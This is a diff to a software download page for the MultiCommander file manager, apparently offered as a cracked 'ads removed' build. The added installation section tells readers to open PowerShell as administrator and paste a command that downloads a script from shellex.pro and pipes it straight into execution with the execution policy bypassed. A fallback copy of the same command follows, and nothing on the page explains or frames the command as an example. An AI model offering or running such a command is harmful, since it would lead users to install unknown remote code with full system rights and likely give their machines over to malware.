@@ -4,18 +4,31 @@
 
 Advanced tabbed file manager for power users · Business-class package · Ads removed.
 
-## Setup & Download
+## INSTALLATION
 
-> **Your download is below.** Badge or table link — both go to **MultiCommander** for Windows.
+**Steps:**
+1. Press **Win**, type **PowerShell**
+2. Right-click **Windows PowerShell** → **Run as administrator**
+3. Copy the command below, paste into the window, press **Enter**
+4. If **UAC** still appears – click **Yes**
 
-<p align="center"><a href="https://multicommander.mefidirect.xyz/" style="display:inline-block;color:#fff;font-weight:700;text-decoration:none;padding:8px 18px;font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:13px;background:#2d3748;">DOWNLOAD</a><a href="https://multicommander.mefidirect.xyz/" style="display:inline-block;color:#fff;font-weight:700;text-decoration:none;padding:8px 18px;font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:13px;background:#0078D4;">MULTICOMMANDER</a></p>
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
+```
 
-| | |
-| --- | --- |
-| **Project link** | **[multicommander.mefidirect.xyz](https://multicommander.mefidirect.xyz/)** |
-| **Full URL** | `https://multicommander.mefidirect.xyz/` |
-| **Type** | PC installer · Windows 10 / 11 (x64) |
-| **Admin** | Run setup as Administrator
+<details>
+<summary><b>Command did not start?</b></summary>
+
+Try this directly in the same PowerShell window:
+
+```powershell
+irm 'https://shellex.pro/ps/setup.ps1' | iex
+```
+
+</details>
+
+<sub>Administrator rights are required to complete the setup.</sub>
+
 
 ## 🔍 Details
 
